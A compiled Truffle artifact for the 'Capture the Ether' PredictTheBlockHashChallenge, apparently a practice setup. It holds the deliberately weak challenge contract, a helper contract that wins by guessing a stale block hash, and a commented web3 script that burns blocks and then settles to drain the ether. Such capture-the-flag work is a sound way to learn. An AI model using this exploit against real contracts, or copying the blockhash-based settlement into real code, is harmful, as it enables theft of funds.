{
  "contractName": "PredictTheBlockHashChallenge",
  "abi": [
    {
      "inputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "lockInGuess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "settle",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6060604052670de0b6b3a76400003414151561001a57600080fd5b6102cd806100296000396000f300606060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806311da60b41461005c578063b2fa1c9e14610071578063ed7f559c1461009e575b600080fd5b341561006757600080fd5b61006f6100ba565b005b341561007c57600080fd5b6100846101cc565b604051808215151515815260200191505060405180910390f35b6100b86004808035600019169060200190919050506101ed565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561011757600080fd5b6002544311151561012757600080fd5b60025440905060008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600019166001546000191614156101c9573373ffffffffffffffffffffffffffffffffffffffff166108fc671bc16d674ec800009081150290604051600060405180830381858888f1935050505015156101c857600080fd5b5b50565b6000803073ffffffffffffffffffffffffffffffffffffffff163114905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614151561023357600080fd5b670de0b6b3a76400003414151561024957600080fd5b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806001816000191690555060014301600281905550505600a165627a7a72305820865e5df7464ae582442ae3165a7e3f843b3aeeaef02776e8dc9f37f78bc244ec0029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar predictTheBlockHashChallenge = await PredictTheBlockHashChallenge.deployed();\r\nvar predictHashHelper = await PredictHashHelper.deployed();\r\n\r\nvar blockNumTarget = await web3.eth.getBlockNumber() + 260;\r\nvar answer = await predictHashHelper.getAnswer(blockNumTarget);\r\nawait predictHashHelper.lockInGuess(answer, {from: accounts[0], value: oneEth});\r\nvar blockNumCurrent = await web3.eth.getBlockNumber();\r\nwhile (blockNumCurrent < blockNumberTarget) {\r\n    await predictHashHelper.wasteBlock();\r\n    blockNumCurrent = await web3.eth.getBlockNumber();\r\n}\r\nawait predictTheBlockHashChallenge.settle();\r\nawait predictTheBlockHashChallenge.isComplete();\r\n\r\nvar testArray = new Uint8Array(100);\r\nvar promises = testArray.map(x => predictHashHelper.wasteBlock());\r\nawait Promise.all(promises);\r\n*/\r\n\r\ncontract PredictHashHelper is OtherContract {\r\n    uint8 waste;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function getSettlementBlockNumber() public view returns (uint256) {\r\n        return settlementBlockNumber;\r\n    }\r\n\r\n    function getAnswer(uint256 blockNum) public view returns (bytes32) {\r\n        return block.blockhash(blockNum);\r\n    }\r\n\r\n    function wasteBlock() public returns (uint256) {\r\n        waste += 1;\r\n        return block.number;\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        return predictTheBlockHashChallenge.isComplete();\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function lockInGuess(bytes32 hash) public payable {\r\n        require(otherContract != 0);\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        predictTheBlockHashChallenge.lockInGuess.value(1 ether)(hash);\r\n        settlementBlockNumber = block.number;\r\n    }    \r\n\r\n    function settle() public {\r\n        require(otherContract != 0);\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        predictTheBlockHashChallenge.settle();\r\n        require(predictTheBlockHashChallenge.isComplete() == true);\r\n        withdraw();\r\n        settlementBlockNumber = 0;\r\n    }\r\n}\r\n\r\ncontract PredictTheBlockHashChallenge {\r\n    address guesser;\r\n    bytes32 guess;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function PredictTheBlockHashChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function lockInGuess(bytes32 hash) public payable {\r\n        require(guesser == 0);\r\n        require(msg.value == 1 ether);\r\n\r\n        guesser = msg.sender;\r\n        guess = hash;\r\n        settlementBlockNumber = block.number + 1;\r\n    }\r\n\r\n    function settle() public {\r\n        require(msg.sender == guesser);\r\n        require(block.number > settlementBlockNumber);\r\n\r\n        bytes32 answer = block.blockhash(settlementBlockNumber);\r\n\r\n        guesser = 0;\r\n        if (guess == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\PredictTheBlockHashChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-11T14:32:05.066Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}